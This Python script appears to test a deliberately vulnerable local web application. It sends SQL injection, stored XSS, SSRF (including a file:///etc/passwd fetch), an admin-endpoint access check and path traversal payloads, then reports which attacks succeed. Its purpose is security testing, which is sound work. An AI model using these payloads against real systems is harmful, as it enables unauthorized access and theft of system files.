import requests
import sys

# Base URL of the vulnerable application
BASE_URL = "http://localhost:5000"

def test_sql_injection():
    print("\n=== Testing SQL Injection ===")
    # This payload will bypass authentication if the app is vulnerable to SQL injection
    payload = {
        'username': "' OR '1'='1",
        'password': "anything"
    }
    
    try:
        response = requests.post(f"{BASE_URL}/login", data=payload, allow_redirects=False)
        if response.status_code == 302:  # Redirect on successful login
            print("✅ SQL Injection successful! Login bypassed.")
        else:
            print("❌ SQL Injection failed.")
    except Exception as e:
        print(f"❌ Error testing SQL Injection: {str(e)}")

def test_xss():
    print("\n=== Testing Stored XSS ===")
    # First, log in as a test user
    session = requests.Session()
    login_data = {
        'username': 'user1',
        'password': 'user123'
    }
    
    try:
        # Log in
        response = session.post(f"{BASE_URL}/login", data=login_data)
        if "Invalid username or password" in response.text:
            print("❌ Failed to log in for XSS test.")
            return
        
        # Post a comment with XSS payload
        xss_payload = "<script>alert('XSS')</script>"
        document_id = 1  # Assuming document with ID 1 exists
        
        response = session.post(f"{BASE_URL}/comment", data={
            'document_id': document_id,
            'content': xss_payload
        })
        
        if response.status_code == 302:  # Redirect after posting comment
            print("✅ XSS payload successfully stored.")
            print(f"   Visit {BASE_URL}/document/{document_id} to see the XSS in action.")
        else:
            print("❌ Failed to store XSS payload.")
    except Exception as e:
        print(f"❌ Error testing XSS: {str(e)}")

def test_ssrf():
    print("\n=== Testing SSRF ===")
    # Try to access internal services
    test_urls = [
        "http://localhost:5000/api/fetch?url=http://localhost:5000/api/admin/users&api_key=insecure_api_key_123",
        "http://localhost:5000/api/fetch?url=file:///etc/passwd&api_key=insecure_api_key_123"
    ]
    
    for url in test_urls:
        try:
            response = requests.get(url, timeout=5)
            print(f"\nSSRF Test: {url}")
            print(f"Status Code: {response.status_code}")
            print(f"Response (first 200 chars): {response.text[:200]}...")
            
            if response.status_code == 200:
                print("✅ SSRF may be possible!")
            else:
                print("❌ SSRF attempt failed.")
        except Exception as e:
            print(f"❌ Error testing SSRF with {url}: {str(e)}")

def test_idor():
    print("\n=== Testing IDOR ===")
    # Try to access admin endpoint without proper authorization
    try:
        response = requests.get(
            f"{BASE_URL}/api/admin/users?api_key=insecure_api_key_123"
        )
        
        print(f"Admin endpoint response status: {response.status_code}")
        if response.status_code == 200:
            print("✅ IDOR vulnerability found! Accessed admin endpoint.")
            print(f"Response: {response.json()}")
        else:
            print("❌ Could not access admin endpoint.")
    except Exception as e:
        print(f"❌ Error testing IDOR: {str(e)}")

def test_path_traversal():
    print("\n=== Testing Path Traversal ===")
    # Try to access sensitive files using path traversal
    test_files = [
        "../../../etc/passwd",
        "../../../etc/hosts"
    ]
    
    for test_file in test_files:
        try:
            response = requests.get(f"{BASE_URL}/uploads/{test_file}")
            print(f"\nPath Traversal Test: {test_file}")
            print(f"Status Code: {response.status_code}")
            
            if response.status_code == 200 and "root:" in response.text:
                print("✅ Path Traversal successful!")
                print(f"Response (first 200 chars): {response.text[:200]}...")
            else:
                print("❌ Path Traversal attempt failed.")
        except Exception as e:
            print(f"❌ Error testing Path Traversal: {str(e)}")

if __name__ == "__main__":
    print("=== Starting Vulnerability Tests ===")
    print(f"Testing application at: {BASE_URL}")
    
    # Run all tests
    test_sql_injection()
    test_xss()
    test_ssrf()
    test_idor()
    test_path_traversal()
    
    print("\n=== Testing Complete ===")
    print("Note: Some tests may require manual verification by visiting the application.")
